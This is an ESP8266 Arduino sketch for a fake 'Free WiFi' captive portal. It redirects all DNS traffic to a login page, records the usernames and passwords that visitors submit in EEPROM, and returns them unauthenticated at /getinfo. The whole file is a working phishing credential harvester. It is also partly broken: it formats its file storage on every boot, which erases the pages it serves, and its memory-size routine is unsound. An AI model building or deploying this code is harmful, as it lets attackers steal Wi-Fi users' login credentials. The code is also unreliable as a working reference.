#include <FS.h>
#include <EEPROM.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* SSID_NAME = "Free WiFi"; // Change this to your preferred SSID
const byte HTTP_PORT = 80;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer httpServer(HTTP_PORT);

int memorySize() {
  String text;
  int nullCount = 0;
  for (int i = 0; i < 512; i++) {
    text += char(EEPROM.read(i));
    if (String(EEPROM.read(i)).length() == 1) {
      nullCount++;
    }
  }
  return text.length() - nullCount;
}

void writeToMemory(String text) {
  int memSize = memorySize();
  for (int i = 0; i < text.length(); i++) {
    EEPROM.write(memSize + i, text[i]);
  }
  EEPROM.commit();
}

String readFromMemory() {
  String text;
  for (int i = 0; i < 512; i++) {
    text += char(EEPROM.read(i));
  }
  return text;
}

void clearMemory() {
  for (int i = 0; i < 512; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.commit();
  ESP.restart();
}

void formatSPIFFS() {
  if (SPIFFS.format()) {
    Serial.println("SPIFFS formatted successfully.");
  } else {
    Serial.println("SPIFFS format failed.");
  }
}

void setup() {
  Serial.begin(9600);
  Serial.println("Starting...");

  // Format SPIFFS
  formatSPIFFS();

  // Initialize EEPROM and clear memory (optional)
  EEPROM.begin(512);
  // clearMemory(); // Comment out this line if you don't want to clear memory on every startup

  // Initialize SPIFFS
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }

  // Set up Wi-Fi
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(SSID_NAME, "12345678"); // Set the SSID and password

  dnsServer.start(DNS_PORT, "*", apIP);

  // Set up HTTP server
  httpServer.serveStatic("/", SPIFFS, "/index.html");
  httpServer.serveStatic("/assets", SPIFFS, "/assets");

  httpServer.on("/postinfo", []() {
    String username = httpServer.arg("username");
    String password = httpServer.arg("password");
    writeToMemory(username + ":" + password + "<br>");
    httpServer.send(200, "text/html", "Connected");
  });

  httpServer.on("/getinfo", []() {
    String data = readFromMemory();
    httpServer.send(200, "text/html", data);
  });

  httpServer.on("/deleteinfo", []() {
    clearMemory();
    httpServer.send(200, "text/html", "OK");
  });

  httpServer.onNotFound([]() {
    Serial.println("Not found, redirecting...");
    httpServer.sendHeader("Location", String("/"), true);
    httpServer.send(302, "text/plain", "");
  });

  httpServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  httpServer.handleClient();
}